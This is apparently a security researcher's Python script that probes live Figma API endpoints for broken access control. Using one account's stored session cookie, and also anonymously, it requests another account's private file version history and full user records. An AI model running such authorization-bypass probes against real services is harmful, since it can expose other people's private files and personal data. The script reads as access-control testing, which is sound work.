# -*- coding: utf-8 -*-
"""versions 版本历史面 + users/batched 完整响应: B(无注入) 视角
- versions: B 对自己文件 vs A 私有文件 (权限模型)
- users/batched: 完整字段 (是否泄露 email/组织关系)
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_DESIGN = "5Gs4PaTz11Hlk2sqVnidBG"
B_MAKE = "QooNP4ZnOkwGbudKlPX635"   # B 自己的 make 文件
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')


def call(label, method, path, query=None, body=None, cookie=BC):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/", "Cookie": cookie}
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    url = BASE + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} len={len(raw)} :: {raw[:400]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} :: {raw[:400]}")
        return e.code, raw


print("===== 1. versions: B 自己文件 (基线) =====")
st, raw = call("B versions own", "GET", f"/api/versions/{B_MAKE}", {"page_size": 200})
if st == 200:
    try:
        d = json.loads(raw)
        ver = d.get("meta", {}).get("versions", [])
        print(f"  -> {len(ver)} versions; keys={list(d.get('meta', {}).keys())}")
        if ver:
            print("  -> first version:", json.dumps(ver[0], indent=1)[:600])
    except Exception as e:
        print("  parse err", e)

print("\n===== 2. versions: A 私有文件 (越权目标) =====")
call("B versions A", "GET", f"/api/versions/{A_DESIGN}", {"page_size": 200})
call("anon versions A", "GET", f"/api/versions/{A_DESIGN}", {"page_size": 200}, cookie="")

print("\n===== 3. versions: 匿名公开文件 (对照) =====")
call("anon versions public", "GET", "/api/versions/bv2nMIdFf4u3dESGail4sm", {"page_size": 5}, cookie="")

print("\n===== 4. users/batched 完整字段 =====")
st, raw = call("users/batched A", "GET", "/api/users/batched", {"user_ids": A_UID})
if st == 200:
    print("  FULL:", raw[:1200])

print("\n===== 5. versions 附加参数探测 =====")
call("versions +before", "GET", f"/api/versions/{A_DESIGN}", {"page_size": 5, "before": "1"})
call("versions +cursor", "GET", f"/api/versions/{A_DESIGN}", {"page_size": 5, "cursor": "1"})
